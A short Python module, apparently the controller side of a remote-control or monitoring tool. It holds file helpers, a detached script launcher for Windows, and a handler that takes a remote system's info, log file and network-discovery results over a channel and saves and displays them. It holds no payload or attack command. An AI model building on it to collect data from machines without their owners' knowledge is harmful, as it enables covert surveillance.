import subprocess
import logging
import platform

def save_in_file(file_name, data):
        current_file = open(file_name, 'a+')
        current_file.write(data + "\n")
        current_file.close()


def save_raw_file(file_name, data):
        current_file = open(file_name, 'wb')
        current_file.write(data)
        current_file.close()


def read_raw_file(file_name):
        current_file = open(file_name, 'rb')
        data = current_file.read()
        current_file.close()
        return data


def run_py_script(script_name, log_file_name):
        script = "py.exe" # executable python 3 on windows
        detached_process = 0x00000008
        create_new_process_group = 0x00000200
        subprocess.Popen([script, script_name, "-l" + log_file_name], shell=True,
                        creationflags=detached_process | create_new_process_group)


def open_notepad(file_name):
        subprocess.Popen(["notepad", file_name])


def analyse_recv_data(secure_communication, recv_msg):
	if recv_msg is not None and recv_msg[:6] == "[INFO]":
		print("Remote system info :", recv_msg[6:])
		logging.info("Remote system info :\n{0}".format(recv_msg[6:]))
	if recv_msg is not None and recv_msg[:5] == "[LOG]":
		try:
                        size_data = int(recv_msg[5:])
                        if size_data > 0:
                                print("Client logs file size: ", size_data, "b")
                                logging.info("Client logs file size: " + str(size_data))
                                log_data = secure_communication.recv_msg(size_data)
                                save_in_file("clientlog.log", log_data)
                                open_notepad("clientlog.log")
                        else:
                                print("[!] The file does not exist !")
		except TypeError as identifier:
			print("Type error: {}", identifier)
	if recv_msg is not None and recv_msg[:10] == "[NetDisco]":
		print("\n" + recv_msg[10:])
		logging.info("\n{0}".format(recv_msg[10:]))
